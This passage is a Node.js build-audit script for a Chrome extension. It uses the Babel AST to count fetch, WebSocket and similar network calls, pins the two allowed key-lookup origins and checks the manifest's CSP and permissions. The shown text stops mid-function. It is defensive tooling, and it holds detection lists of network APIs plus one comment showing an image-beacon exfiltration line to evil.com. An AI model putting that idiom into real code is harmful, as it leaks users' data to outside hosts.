#!/usr/bin/env node
// audit-network.mjs — AST-based post-build supply-chain guard.
//
// Parses every script in the build output and checks network-capable
// constructs against a PER-CONTEXT census with EXACT counts:
//   worker  exactly two `fetch` calls, each statically resolved to one pinned
//           origin with a pinned init shape (SECURITY.md §7, §13;
//           T-GITHUB-LOOKUP-DISCLOSURE, T-KEYSERVER-LOOKUP-DISCLOSURE).
//   page    no remote-destination fetch, no XHR/WebSocket/etc., and no
//           absolute URL literal outside a pinned set.
// Counts are exact so deleting a guard fails as loudly as adding a leak; if a
// real change moves them, re-pin here in the same commit and say why.
//
// NOT proven: aliasing (`const f = fetch`) is the runtime lockdown's job
// (src/lib/network-lockdown.ts); URL checks are a change detector that misses
// hosts assembled from fragments without "://"; the resolver is bounded
// single-file constant propagation and errors rather than guesses. Chrome's
// built-in AI APIs are browser-mediated and invisible here — see
// T-AI-AUDIT-BLINDSPOT and T-AI-TRANSLATE-METADATA.
//
// Usage:  node scripts/audit-network.mjs [output-dir]   (default .output/chrome-mv3)
//         --census dumps the observed census, for re-pinning after a real change.
import { readdirSync, readFileSync, statSync } from "node:fs";
import { extname, join, posix, relative } from "node:path";
import { parse } from "@babel/parser";
import _traverse from "@babel/traverse";

const traverse =
  typeof _traverse === "function" ? _traverse : _traverse.default;

const OUTPUT_DIR =
  process.argv.slice(2).find((a) => !a.startsWith("--")) ||
  ".output/chrome-mv3";
// `--census` rather than an env var: turbo.json pins the env vars the build may read.
const CENSUS_MODE = process.argv.includes("--census");

const DANGEROUS_GLOBALS = new Set([
  "fetch",
  "XMLHttpRequest",
  "WebSocket",
  "EventSource",
  "RTCPeerConnection",
  "RTCDataChannel",
  "RTCSctpTransport",
  "importScripts",
]);

const DANGEROUS_METHODS = new Set([
  "sendBeacon", // navigator.sendBeacon
  "createDataChannel", // RTCPeerConnection.createDataChannel
  "createOffer", // RTCPeerConnection.createOffer
  "createAnswer", // RTCPeerConnection.createAnswer
  "setRemoteDescription", // RTCPeerConnection.setRemoteDescription
  "addIceCandidate", // RTCPeerConnection.addIceCandidate
]);

const DANGEROUS_CONSTRUCTORS = new Set([
  "Worker",
  "SharedWorker",
  "Function", // new Function("return fetch")()
  "Image", // new Image().src = "https://evil.com?data=..."
]);

// The two key-discovery origins and nothing else. Exactly one built file (the
// worker) may contain each; the manifest CSP narrows each to a path prefix.
const GITHUB_ORIGIN = "https://api.github.com";
const KEYSERVER_ORIGIN = "https://keys.openpgp.org";
const WORKER_ORIGINS = [GITHUB_ORIGIN, KEYSERVER_ORIGIN];

/** Path prefix the manifest CSP pins each origin to, in the order the
 *  `connect-src` directive lists them. */
const CONNECT_SRC_PATHS = {
  [GITHUB_ORIGIN]: "/users/",
  [KEYSERVER_ORIGIN]: "/vks/v1/",
};

// The worker file is read from the manifest but must equal this, so a rename
// fails loudly. Every other script is "page" by default.
const EXPECTED_WORKER_FILE = "background.js";

// Keys are `${kind}:${name}`; anything unlisted or miscounted fails.
// worker: ref:fetch is the lockdown reading the global; call:fetch is
//   src/lib/github/fetch-keys.ts + src/lib/keyserver/fetch-key.ts (pinned apart below).
// page: the same lockdown ref; two wasm-loader fetches; one gpg_wasm import().
// Minified lockdown stubs are anonymous, hence no ref:XMLHttpRequest entries.
const EXPECTED_CENSUS = {
  worker: {
    "ref:fetch": 1,
    "call:fetch": 2,
  },
  page: {
    "ref:fetch": 1,
    "call:fetch": 2,
    "dynamic-import:import()": 1,
  },
};

// Every call:fetch / dynamic-import finding must match exactly one pin and
// vice versa, so a leak cannot inherit a legitimate call's budget.
//   snippet           substring of the call source (weak; last resort)
//   destinationOrigin resolved origin of arg 0; null = must NOT be remote
//   init              exact init shape; no keys beyond init ∪ initOptionalKeys
const PINNED_CALL_SITES = {
  worker: [
    {
      kind: "call",
      name: "fetch",
      reason: "src/lib/github/fetch-keys.ts -- the GitHub SSH-key lookup",
      // The destination is the pin that matters (a snippet would match any
      // call carrying the same options). The init shape keeps no cookies,
      // no redirect-following, no cache entry.
      destinationOrigin: GITHUB_ORIGIN,
      init: {
        method: "GET",
        credentials: "omit",
        redirect: "error",
        cache: "no-store",
      },
      initOptionalKeys: ["signal", "headers"],
    },
    {
      kind: "call",
      name: "fetch",
      reason:
        "src/lib/keyserver/fetch-key.ts -- the keys.openpgp.org certificate lookup",
      // One pin per origin: two GitHub fetches leave this one unmatched.
      destinationOrigin: KEYSERVER_ORIGIN,
      init: {
        method: "GET",
        credentials: "omit",
        redirect: "error",
        cache: "no-store",
      },
      initOptionalKeys: ["signal", "headers"],
    },
  ],
  // Pinned on wasm-bindgen glue idioms, not minified names.
  page: [
    {
      kind: "call",
      name: "fetch",
      snippet: "arrayBuffer()",
      destinationOrigin: null,
      reason: "sidepanel entry chunk: fetches the extension-local .wasm",
    },
    {
      kind: "call",
      name: "fetch",
      snippet: "instance:",
      destinationOrigin: null,
      reason: "gpg_wasm chunk: the wasm-bindgen init loader",
    },
    {
      kind: "dynamic-import",
      name: "import()",
      snippet: "gpg_wasm",
      destinationOrigin: null,
      reason: "code-split import of the local gpg_wasm chunk",
    },
  ],
};

// Raw-text scan, so concatenation fragments are seen. Page entries are XML
// namespaces, href targets, lockdown scheme tests and an error-message link —
// none a connect destination (connect-src 'self', frame-src 'none'); listed so
// the set cannot grow quietly. MENU_MATCH_PATTERNS (src/lib/context-menu.ts) are
// wildcard match patterns compared against a URL, never fetched.
const MENU_MATCH_PATTERNS = ["http://*/*", "https://*/*", "file:///*"];

const EXPECTED_URL_LITERALS = {
  worker: [
    "http://", //
    "chrome-extension://",
    ...WORKER_ORIGINS,
    ...MENU_MATCH_PATTERNS,
  ],
  page: [
    "http://",
    "chrome-extension://",
    "http://www.w3.org/2000/svg",
    "http://www.w3.org/1998/Math/MathML",
    "http://www.w3.org/1999/xlink",
    "http://www.w3.org/XML/1998/namespace",
    "https://react.dev/errors/",
    "https://amibeingpwned.com",
    "https://developer.chrome.com/docs/webstore/update#protect-package-updates",
    "https://github.com/Am-I-Being-Pwned/PGP-Tools",
    "chrome://extensions/shortcuts",
    // date-fns error-message doc link; never fetched or rendered.
    "https://github.com/date-fns/date-fns/blob/master/docs/unicodeTokens.md",
  ],
};

// Exact SETS, not a denylist, so anything new fails. downloads is optional
// because the FSA save picker crashes the side panel. Network-capable
// permissions (DNR, webRequest, nativeMessaging, proxy, debugger, scripting,
// tabs, cookies) are therefore forbidden by construction.
const EXPECTED_PERMISSIONS = ["sidePanel", "contextMenus", "storage", "idle"];
const EXPECTED_OPTIONAL_PERMISSIONS = ["downloads"];

// Must be ABSENT, not merely empty — an added key is near-invisible in a
// generated manifest diff.
const FORBIDDEN_MANIFEST_KEYS = {
  host_permissions:
    "the GitHub lookup is unauthenticated CORS and needs no host permission; a host permission attaches the user's cookies-and-all origin privileges to a request we deliberately make anonymous",
  optional_host_permissions:
    "same as host_permissions -- an optional one is still one prompt away from being granted",
  sandbox:
    "a sandboxed page is exempt from the extension_pages CSP ENTIRELY, so a single sandbox.pages entry is a complete bypass of connect-src",
  content_scripts:
    "this extension injects nothing into web pages; a content script runs in a page's realm where our CSP does not apply",
  declarative_net_request:
    "DNR rules can redirect or rewrite requests without any code in the bundle",
  externally_connectable:
    "nothing outside the extension may open a message port into the worker",
  web_accessible_resources:
    "no extension resource is exposed to web origins; a WAR page is loadable (and framable) by any site that matches",
};

function collectFiles(dir, base = dir) {
  const files = [];
  for (const entry of readdirSync(dir)) {
    const full = join(dir, entry);
    if (statSync(full).isDirectory()) {
      files.push(...collectFiles(full, base));
    } else {
      files.push(relative(base, full).split(/[\\/]/).join("/"));
    }
  }
  return files;
}

// A file is inert only if its extension is listed; everything else is parsed
// as script and fails the build if it will not parse.
const INERT_EXTENSIONS = new Set([
  ".png",
  ".jpg",
  ".jpeg",
  ".gif",
  ".webp",
  ".ico",
  ".bmp",
  ".avif",
  ".svg", // not loadable as script from an extension page; img-src only
  ".wasm", // bytes, not script; the CSP has no wasm origin to widen
  ".json", // manifest.json and friends; validated separately
  ".map", // source maps
  ".woff",
  ".woff2",
  ".ttf",
  ".otf",
  ".eot",
  ".md",
  ".txt",
  ".webmanifest",
]);

function classifyFiles(allFiles, referencedScripts) {
  const scripts = [];
  const css = [];
  const html = [];
  const inert = [];
  for (const rel of allFiles) {
    const ext = extname(rel).toLowerCase();
    if (ext === ".css") css.push(rel);
    else if (ext === ".html" || ext === ".htm") html.push(rel);
    else if (referencedScripts.has(rel) || !INERT_EXTENSIONS.has(ext))
      scripts.push(rel);
    else inert.push(rel);
  }
  return { scripts, css, html, inert };
}

function resolveRef(ref, fromFile = "") {
  const clean = ref.split("?")[0].split("#")[0];
  if (/^[a-z][a-z0-9+.-]*:/i.test(clean) || clean.startsWith("//")) return null;
  if (clean.startsWith("/")) return clean.slice(1);
  return posix.normalize(posix.join(posix.dirname(fromFile || "."), clean));
}

// Every script the manifest can cause to run.
function manifestScriptRefs(manifest) {
  const refs = [];
  const bg = manifest.background ?? {};
  if (typeof bg.service_worker === "string") refs.push(bg.service_worker);
  for (const s of Array.isArray(bg.scripts) ? bg.scripts : []) refs.push(s);
  for (const cs of Array.isArray(manifest.content_scripts)
    ? manifest.content_scripts
    : []) {
    for (const s of cs.js ?? []) refs.push(s);
  }
  return refs.map((r) => resolveRef(r)).filter(Boolean);
}

// Every HTML page the manifest can cause to be opened.
function manifestPageRefs(manifest) {
  const refs = [
    manifest.side_panel?.default_path,
    manifest.action?.default_popup,
    manifest.browser_action?.default_popup,
    manifest.options_page,
    manifest.options_ui?.page,
    manifest.devtools_page,
    ...Object.values(manifest.chrome_url_overrides ?? {}),
  ];
  return refs
    .filter((r) => typeof r === "string")
    .map((r) => resolveRef(r))
    .filter(Boolean);
}

const HTML_SCRIPT_SRC_RE = /<script\b[^>]*\bsrc\s*=\s*["']([^"']+)["']/gi;
const HTML_INLINE_SCRIPT_RE =
  /<script\b(?![^>]*\bsrc\s*=)[^>]*>([\s\S]*?)<\/script>/gi;

function htmlScriptRefs(html, fromFile) {
  HTML_SCRIPT_SRC_RE.lastIndex = 0;
  return [...html.matchAll(HTML_SCRIPT_SRC_RE)]
    .map((m) => resolveRef(m[1], fromFile))
    .filter(Boolean);
}

function htmlInlineScripts(html) {
  HTML_INLINE_SCRIPT_RE.lastIndex = 0;
  return [...html.matchAll(HTML_INLINE_SCRIPT_RE)].filter(
    (m) => m[1].trim() !== "",
  );
}

function snippetAt(source, node, contextChars = 80) {
  const start = Math.max(0, node.start - 10);
  const end = Math.min(source.length, node.end + contextChars);
  return source.slice(start, end);
}

// Raw text, not AST literals, so concatenation fragments are seen. Three
// patterns: any `scheme://`, protocol-relative `"//host.tld"`, and a split
// `"https:" + "//"`. Each runs over raw and escape-decoded source. Still open:
// a host built from fragments with no `://` or leading `//`.
const SCHEME_URL_RE = /[a-z][a-z0-9+.-]{1,31}:\/\/[^"'`\s\\)>]*/gi;
const PROTO_RELATIVE_RE =
  /["'`](\/\/[a-z0-9-]+(?:\.[a-z0-9-]+)+[^"'`\s\\)>]*)/gi;
const SPLIT_SCHEME_RE = /["'`](https?:)(?!\/\/)/gi;

// Decode JS string escapes that can spell ASCII; only matched text is used.
function decodeStringEscapes(source) {
  return source
    .replace(/\\x([0-9a-fA-F]{2})/g, (_, h) =>
      String.fromCharCode(parseInt(h, 16)),
    )
    .replace(/\\u\{([0-9a-fA-F]{1,6})\}/g, (m, h) => {
      const cp = parseInt(h, 16);
      return cp <= 0x10ffff ? String.fromCodePoint(cp) : m;
    })
    .replace(/\\u([0-9a-fA-F]{4})/g, (_, h) =>
      String.fromCharCode(parseInt(h, 16)),
    )
    .replace(/\\\//g, "/");
}

function urlLiteralsIn(source) {
  const found = new Set();
  const decoded = decodeStringEscapes(source);
  for (const text of decoded === source ? [source] : [source, decoded]) {
    for (const [re, group] of [
      [SCHEME_URL_RE, 0],
      [PROTO_RELATIVE_RE, 1],
      [SPLIT_SCHEME_RE, 1],
    ]) {
      re.lastIndex = 0;
      for (const m of text.matchAll(re)) found.add(m[group]);
    }
  }
  return [...found];
}

// Worker bundle must be self-contained, or the single-file origin check is meaningless.
const MODULE_SPECIFIER_RE = /\b(?:from|import)\s*["']([^"']+)["']/g;

function moduleSpecifiersIn(source) {
  MODULE_SPECIFIER_RE.lastIndex = 0;
  return [...source.matchAll(MODULE_SPECIFIER_RE)].map((m) => m[1]);
}

// ── RESOLVER ────────────────────────────────────────────────────────
// Bounded constant propagation over one file's AST: literals, template heads,
// left operand of `+`, unique bindings, a param via its single call site, a
// local function's single return, and `new URL(path, base)` → base.
// Anything else returns null, which FAILS a pin requiring an origin.
const RESOLVE_DEPTH = 16;

function callSitesOf(fnPath) {
  const id = fnPath.node.id;
  if (!id) return [];
  const binding = fnPath.parentPath?.scope.getBinding(id.name);
  if (!binding) return [];
  return binding.referencePaths
    .filter(
      (r) =>
        r.parentPath?.isCallExpression() && r.parentPath.node.callee === r.node,
    )
    .map((r) => r.parentPath);
}

function functionForCallee(path, name) {
  const binding = path.scope.getBinding(name);
  if (!binding) return null;
  if (binding.path.isFunctionDeclaration()) return binding.path;
  if (binding.path.isVariableDeclarator()) {
    const init = binding.path.get("init");
    if (
      init.node &&
      (init.isFunctionExpression() || init.isArrowFunctionExpression())
    )
      return init;
  }
  return null;
}

function resolveStatic(path, env, depth, seen) {
  if (!path || !path.node || depth > RESOLVE_DEPTH) return null;
  if (seen.has(path.node)) return null;
  seen.add(path.node);
  const node = path.node;

  switch (node.type) {
    case "StringLiteral":
      return node.value;

    case "TemplateLiteral": {
      const head = node.quasis[0]?.value.cooked ?? "";
      if (head !== "") return head;
      if (node.expressions.length > 0)
        return resolveStatic(path.get("expressions.0"), env, depth + 1, seen);
      return null;
    }

    case "BinaryExpression":
      if (node.operator !== "+") return null;
      return resolveStatic(path.get("left"), env, depth + 1, seen);

    case "AwaitExpression":
    case "TSNonNullExpression":
      return resolveStatic(path.get("argument"), env, depth + 1, seen);

    case "ParenthesizedExpression":
      return resolveStatic(path.get("expression"), env, depth + 1, seen);

    case "Identifier": {
      const binding = path.scope.getBinding(node.name);
      if (!binding) return null;
      if (env.has(binding)) {
        const bound = env.get(binding);
        return resolveStatic(bound.path, bound.env, depth + 1, seen);
      }
      if (binding.kind === "param") {
        const fnPath = binding.scope.path;
        if (!fnPath.node.params) return null;
        const index = fnPath.node.params.indexOf(binding.path.node);
        if (index < 0) return null;
        const sites = callSitesOf(fnPath);
        if (sites.length !== 1) return null;
        const args = sites[0].get("arguments");
        return resolveStatic(args[index], new Map(), depth + 1, seen);
      }
      if (binding.path.isVariableDeclarator()) {
        if (binding.path.node.init)
          return resolveStatic(binding.path.get("init"), env, depth + 1, seen);
        // `let t; try { t = f(x) }` — one assignment is still a constant.
        const writes = binding.constantViolations.filter(
          (p) => p.isAssignmentExpression() && p.node.operator === "=",
        );
        if (writes.length === 1)
          return resolveStatic(writes[0].get("right"), env, depth + 1, seen);
      }
      return null;
    }

    case "NewExpression":
    case "CallExpression": {
      const callee = node.callee;
      if (callee.type !== "Identifier") return null;
      const args = path.get("arguments");
      // `new URL(path, base)` — the base fixes the origin.
      if (node.type === "NewExpression" && callee.name === "URL") {
        if (args.length >= 2)
          return resolveStatic(args[1], env, depth + 1, seen);
        if (args.length === 1)
          return resolveStatic(args[0], env, depth + 1, seen);
        return null;
      }
      const fnPath = functionForCallee(path, callee.name);
      if (!fnPath) return null;
      const returns = [];
      fnPath.get("body").traverse({
        Function(p) {
          p.skip();
        },
        ReturnStatement(p) {
          if (p.node.argument) returns.push(p.get("argument"));
        },
      });
      if (returns.length !== 1) return null;
      const childEnv = new Map();
      fnPath.node.params.forEach((param, i) => {
        if (param.type !== "Identifier" || !args[i]) return;
        const paramBinding = fnPath.scope.getBinding(param.name);
        if (paramBinding) childEnv.set(paramBinding, { path: args[i], env });
      });
      return resolveStatic(returns[0], childEnv, depth + 1, seen);
    }

    default:
      return null;
  }
}

const LOCAL_SCHEMES = new Set([
  "chrome-extension:",
  "moz-extension:",
  "chrome:",
  "about:",
  "blob:",
  "data:",
  "filesystem:",
  "file:",
]);

// The resolved value as an ORIGIN, or null if it is not a remote absolute
// URL. A protocol-relative "//host/x" IS remote and is reported as such.
function originOf(value) {
  if (typeof value !== "string") return null;
  const candidate = value.startsWith("//") ? `https:${value}` : value;
  if (!/^[a-z][a-z0-9+.-]*:\/\//i.test(candidate)) return null;
  try {
    const url = new URL(candidate);
    // Local surfaces, or schemes that carry their payload with them.
    if (LOCAL_SCHEMES.has(url.protocol)) return null;
    return url.origin;
  } catch {
    return null;
  }
}

function readInitObject(callPath) {
  const arg = callPath.get("arguments")[1];
  if (!arg || !arg.node || arg.node.type !== "ObjectExpression") return null;
  const keys = [];
  const values = {};
  for (const prop of arg.node.properties) {
    if (prop.type !== "ObjectProperty" || prop.computed) return null;
    const key =
      prop.key.type === "Identifier"
        ? prop.key.name
        : prop.key.type === "StringLiteral"
          ? prop.key.value
          : null;
    if (key === null) return null;
    keys.push(key);
    if (prop.value.type === "StringLiteral") values[key] = prop.value.value;
    else if (
      prop.value.type === "TemplateLiteral" &&
      prop.value.expressions.length === 0
    )
      values[key] = prop.value.quasis[0].value.cooked;
  }
  return { keys, values };
}

// ── Main scan ───────────────────────────────────────────────────────
function scanFile(source, relPath, contextOf) {
  let ast;
  try {
    ast = parse(source, {
      sourceType: "module",
      allowImportExportEverywhere: true,
      plugins: ["dynamicImport", "importMeta"],
      errorRecovery: true,
    });
  } catch (e) {
    return { findings: [], parseError: e.message };
  }

  const findings = [];

  function addFinding(kind, name, path, detail) {
    const node = path.node ?? path;
    findings.push({
      file: relPath,
      context: contextOf(relPath),
      kind,
      name,
      detail: detail || name,
      start: node.start,
      end: node.end,
      snippet: snippetAt(source, node),
      path: path.node ? path : null,
    });
  }

  traverse(ast, {
    CallExpression(path) {
      const callee = path.node.callee;

      if (callee.type === "Identifier" && callee.name === "eval") {
        addFinding("eval", "eval", path);
        return;
      }

      // Babel parses import() as a CallExpression with callee type "Import".
      if (callee.type === "Import") {
        addFinding("dynamic-import", "import()", path);
        return;
      }

      if (callee.type === "Identifier" && DANGEROUS_GLOBALS.has(callee.name)) {
        addFinding("call", callee.name, path);
        return;
      }

      if (
        callee.type === "MemberExpression" &&
        !callee.computed &&
        callee.property.type === "Identifier"
      ) {
        const prop = callee.property.name;
        if (DANGEROUS_GLOBALS.has(prop) || DANGEROUS_METHODS.has(prop)) {
          addFinding("call", prop, path);
          return;
        }
      }

      if (
        callee.type === "MemberExpression" &&
        callee.computed &&
        callee.property.type === "StringLiteral"
      ) {
        const prop = callee.property.value;
        if (DANGEROUS_GLOBALS.has(prop) || DANGEROUS_METHODS.has(prop)) {
          addFinding("call", prop, path, `computed["${prop}"]`);
        }
      }
    },

    NewExpression(path) {
      const callee = path.node.callee;
      let name = null;

      if (callee.type === "Identifier") {
        name = callee.name;
      } else if (
        callee.type === "MemberExpression" &&
        !callee.computed &&
        callee.property.type === "Identifier"
      ) {
        name = callee.property.name;
      }

      if (
        name &&
        (DANGEROUS_GLOBALS.has(name) || DANGEROUS_CONSTRUCTORS.has(name))
      ) {
        addFinding("new", name, path, `new ${name}`);
      }
    },

    ImportExpression(path) {
      addFinding("dynamic-import", "import()", path);
    },

    // Bare references (aliasing: `const f = fetch`) are counted as "ref".
    Identifier(path) {
      if (!DANGEROUS_GLOBALS.has(path.node.name)) return;

      const parent = path.parent;
      if (parent.type === "CallExpression" && parent.callee === path.node)
        return;
      if (parent.type === "NewExpression" && parent.callee === path.node)
        return;

      if (
        parent.type === "MemberExpression" &&
        parent.property === path.node &&
        !parent.computed
      )
        return;

      if (parent.type === "ObjectProperty" && parent.key === path.node) return;

      addFinding("ref", path.node.name, path, `ref:${path.node.name}`);
    },

    // globalThis.fetch / window.WebSocket on known global carriers.
    MemberExpression(path) {
      if (path.node.computed) return;
      if (path.node.property.type !== "Identifier") return;

      const prop = path.node.property.name;
      if (!DANGEROUS_GLOBALS.has(prop)) return;

      const parent = path.parent;
      if (parent.type === "CallExpression" && parent.callee === path.node)
        return;

      const obj = path.node.object;
      if (
        obj.type === "Identifier" &&
        (obj.name === "globalThis" ||
          obj.name === "window" ||
          obj.name === "self")
      ) {
        addFinding("ref", prop, path, `${obj.name}.${prop}`);
      }
    },
  });

  // Resolve each call/import destination once, while the paths are live.
  for (const f of findings) {
    if (f.kind !== "call" && f.kind !== "dynamic-import") continue;
    if (!f.path) continue;
    const arg = f.path.get("arguments")[0];
    f.resolved = resolveStatic(arg, new Map(), 0, new Set());
    f.resolvedOrigin = originOf(f.resolved);
    if (f.kind === "call" && f.name === "fetch")
      f.init = readInitObject(f.path);
    f.path = null; // don't retain the AST
  }

  return { findings, parseError: null };
}

// External url()/@import in CSS; CSP blocks these too, but don't rely on it staying so.
const EXTERNAL_URL_RE = /url\(\s*["']?(https?:\/\/|\/\/)/gi;
const IMPORT_RE = /@import\s+(?:url\()?["']?(https?:\/\/|\/\/)/gi;

function scanCssFile(source, relPath, contextOf) {
  const findings = [];

  for (const re of [EXTERNAL_URL_RE, IMPORT_RE]) {
    re.lastIndex = 0;
    let match;
    while ((match = re.exec(source)) !== null) {
      const start = Math.max(0, match.index - 20);
      const end = Math.min(source.length, match.index + match[0].length + 80);
      findings.push({
        file: relPath,
        context: contextOf(relPath),
        kind: "css-url",
        name: "external-url",
        detail: "external URL in CSS",
        start: match.index,
        end: match.index + match[0].length,
        snippet: source.slice(start, end),
      });
    }
  }
  return findings;
}

// The built manifest must still carry the policy the audit rests on.
function validateManifest(outputDir, manifest) {
  const errors = [];
  if (!manifest) return ["manifest.json not found or invalid"];

  const cspBlock = manifest.content_security_policy ?? {};
  const csp = cspBlock.extension_pages ?? "";

  // 'none' is strictly stronger than 'self'.
  const required = [
    ["default-src", ["'self'", "'none'"]],
    ["script-src", ["'self'"]],
    ["img-src", ["'self'", "'none'"]],
    ["font-src", ["'self'", "'none'"]],
    ["worker-src", ["'self'", "'none'"]],
    ["frame-src", ["'none'"]],
    ["form-action", ["'none'"]],
    ["object-src", ["'self'", "'none'"]],
  ];

  const escape = (s) => s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  for (const [directive, values] of required) {
    const matched = values.some((v) =>
      new RegExp(`${directive}\\s+[^;]*${escape(v)}`).test(csp),
    );
    if (!matched) {
      errors.push(
        `Missing or wrong: ${directive} must include one of ${values.join(", ")}`,
      );
    }
  }

  // EXACTLY 'self' plus the two path-prefixed endpoints, in order; a
  // containment test would pass an extra origin. CSP does not constrain the
  // query string (T-GITHUB-CSP-SCOPE).
  const EXPECTED_CONNECT_SRC = [
    "connect-src 'self'",
    ...WORKER_ORIGINS.map((o) => `${o}${CONNECT_SRC_PATHS[o]}`),
  ].join(" ");
  const connectDirective = csp
    .split(";")
    .map((d) => d.trim().replace(/\s+/g, " "))
    .find((d) => d.startsWith("connect-src"));
  if (connectDirective !== EXPECTED_CONNECT_SRC) {
    errors.push(
      `connect-src must be exactly "${EXPECTED_CONNECT_SRC}", got ${
        connectDirective === undefined ? "(absent)" : `"${connectDirective}"`
      }`,
    );
  }

  if (
    /script-src\s+[^;]*'unsafe-eval'/.test(csp) &&
    !/script-src\s+[^;]*'wasm-unsafe-eval'/.test(csp)
  ) {
    errors.push("script-src must not include 'unsafe-eval'");
  }

  // Any CSP key besides extension_pages (e.g. sandbox) takes pages out of
  // connect-src entirely — a complete bypass, so it must not exist.
  for (const key of Object.keys(cspBlock)) {
    if (key !== "extension_pages") {
      errors.push(
        `content_security_policy.${key} must be ABSENT (got ${JSON.stringify(cspBlock[key])}) -- a sandboxed page is exempt from the extension_pages policy entirely`,
      );
    }
  }

  // Both lookups are unauthenticated CORS (ACAO *), so no host permission.
  for (const [key, reason] of Object.entries(FORBIDDEN_MANIFEST_KEYS)) {
    if (key in manifest) {
      errors.push(
        `${key} must be ABSENT (got ${JSON.stringify(manifest[key])}) -- ${reason}`,
      );
    }
  }

  // Permissions can reach the network with no bundle code (DNR,
  // nativeMessaging, tabs/cookies), so only this check sees them.
  for (const [key, expected] of [
    ["permissions", EXPECTED_PERMISSIONS],
    ["optional_permissions", EXPECTED_OPTIONAL_PERMISSIONS],
  ]) {
    const got = manifest[key] ?? [];
    if (!Array.isArray(got)) {
      errors.push(`${key} must be an array, got ${JSON.stringify(got)}`);
      continue;
    }
    const added = got.filter((p) => !expected.includes(p));
    const removed = expected.filter((p) => !got.includes(p));
    if (added.length > 0) {
      errors.push(
        `${key} gained ${JSON.stringify(added)} -- the set is pinned to ${JSON.stringify(expected)}; every permission here is one the extension uses, and anything else must be justified in SECURITY.md in the same commit`,
      );
    }
    if (removed.length > 0) {
      errors.push(
        `${key} lost ${JSON.stringify(removed)} -- if that removal is deliberate, update EXPECTED_${key.toUpperCase()} in scripts/audit-network.mjs in the same commit`,
      );
    }
  }

  return errors;
}

// The manifest CSP is extension-wide; the panel's meta CSP pulls it back to
// connect-src 'self'. Meta CSP can only tighten and the browser enforces it
// (not our JS — cf. §8.10). Verified: worker fetch 200, same fetch from panel blocked.
function validatePanelHtml(outputDir) {
  const errors = [];
  try {
    const html = readFileSync(join(outputDir, "sidepanel.html"), "utf-8");
    const normalized = html.replace(/\s+/g, " ");
    const hasMeta =
      /<meta\s+http-equiv="Content-Security-Policy"\s+content="[^"]*connect-src 'self'[^"]*"/.test(
        normalized,
      );
    if (!hasMeta) {
      errors.push(
        'sidepanel.html must carry <meta http-equiv="Content-Security-Policy" content="connect-src \'self\'"> -- without it the panel inherits the worker\'s remote-origin allowances',
      );
    }
  } catch {
    errors.push("sidepanel.html not found in build output");
  }
  return errors;
}

// ── Run ─────────────────────────────────────────────────────────────
try {
  statSync(OUTPUT_DIR);
} catch {
  console.error(`ERROR: Build output not found at ${OUTPUT_DIR}`);
  console.error("       Run the build first, then re-run this script.");
  process.exit(1);
}

const structureErrors = [];

let manifest = null;
try {
  manifest = JSON.parse(
    readFileSync(join(OUTPUT_DIR, "manifest.json"), "utf-8"),
  );
} catch {
  manifest = null;
}

const workerFile =
  (manifest && manifest.background?.service_worker) || EXPECTED_WORKER_FILE;
if (workerFile !== EXPECTED_WORKER_FILE) {
  structureErrors.push(
    `manifest background.service_worker is "${workerFile}", not "${EXPECTED_WORKER_FILE}" -- the worker context moved, so EXPECTED_CENSUS and the single-file origin-literal checks must be re-derived before this audit means anything.`,
  );
}
const contextOf = (rel) => (rel === workerFile ? "worker" : "page");

const allFiles = collectFiles(OUTPUT_DIR);
const referencedScripts = new Set(manifest ? manifestScriptRefs(manifest) : []);
const referencedPages = new Set(manifest ? manifestPageRefs(manifest) : []);

// Pages contribute their <script src> targets to the scan set.
const htmlFiles = allFiles.filter((f) => /\.html?$/i.test(f));
for (const rel of htmlFiles) {
  const html = readFileSync(join(OUTPUT_DIR, rel), "utf-8");
  for (const ref of htmlScriptRefs(html, rel)) referencedScripts.add(ref);
  for (const inline of htmlInlineScripts(html)) {
    structureErrors.push(
      `${rel} contains an INLINE <script> (${inline[1].trim().slice(0, 60).replace(/\s+/g, " ")}…) -- inline script is invisible to this audit and blocked by the extension CSP; it must not be in the build.`,
    );
  }
}

const { scripts, css, inert } = classifyFiles(allFiles, referencedScripts);
const scriptSet = new Set(scripts);

// Anything the manifest or a page will run must exist and be scanned.
for (const ref of referencedScripts) {
  if (!scriptSet.has(ref)) {
    structureErrors.push(
      `${ref} is referenced as a script by the manifest or an HTML page but is ${allFiles.includes(ref) ? "not being scanned" : "missing from the build output"}.`,
    );
  }
}
for (const ref of referencedPages) {
  if (!allFiles.includes(ref)) {
    structureErrors.push(
      `${ref} is referenced as a page by the manifest but is missing from the build output.`,
    );
  }
}

if (scripts.length === 0) {
  console.error(`ERROR: No script files found in ${OUTPUT_DIR}`);
  process.exit(1);
}

const allFindings = [];
const urlLiterals = { worker: new Map(), page: new Map() };
/** Built files naming each permitted origin; must be exactly the worker. */
const originFiles = Object.fromEntries(WORKER_ORIGINS.map((o) => [o, []]));
let workerFileSeen = false;

for (const rel of scripts) {
  const ctx = contextOf(rel);
  const source = readFileSync(join(OUTPUT_DIR, rel), "utf-8");

  const { findings, parseError } = scanFile(source, rel, contextOf);
  if (parseError) {
    structureErrors.push(
      `${rel} could not be parsed as JavaScript (${parseError}) -- every non-inert file in the output is scanned as script; if this one is data, give it an inert extension or add that extension to INERT_EXTENSIONS with a reason.`,
    );
    continue;
  }
  allFindings.push(...findings);

  for (const url of urlLiteralsIn(source)) {
    const seen = urlLiterals[ctx];
    if (!seen.has(url)) seen.set(url, []);
    if (!seen.get(url).includes(rel)) seen.get(url).push(rel);
  }

  for (const origin of WORKER_ORIGINS) {
    if (source.includes(origin)) originFiles[origin].push(rel);
  }

  if (ctx === "worker") {
    workerFileSeen = true;
    // Self-containment: the fetch modules are imported only by the background
    // entry. This makes the resolver's single-file scope sound and fails the
    // day one is imported from the panel. (src/lib/net/capped-body.ts is shared
    // only between the two, so it lands in the same bundle.)
    const specifiers = moduleSpecifiersIn(source);
    if (specifiers.length > 0) {
      structureErrors.push(
        `${rel} is no longer self-contained -- it imports ${specifiers.join(", ")}. Worker code has been split into a shared chunk, so the "one file names each permitted origin" guarantee no longer holds. Re-derive it before editing this script.`,
      );
    }
  }
}

for (const rel of css) {
  const source = readFileSync(join(OUTPUT_DIR, rel), "utf-8");
  allFindings.push(...scanCssFile(source, rel, contextOf));
}

if (!workerFileSeen) {
  structureErrors.push(
    `${workerFile} not found in the build output -- the worker context could not be audited at all.`,
  );
}

if (CENSUS_MODE) {
  for (const ctx of ["worker", "page"]) {
    console.log(`\n── ${ctx} ──`);
    const counts = {};
    for (const f of allFindings.filter((f) => f.context === ctx)) {
      const sig = `${f.kind}:${f.name}`;
      counts[sig] = (counts[sig] ?? 0) + 1;
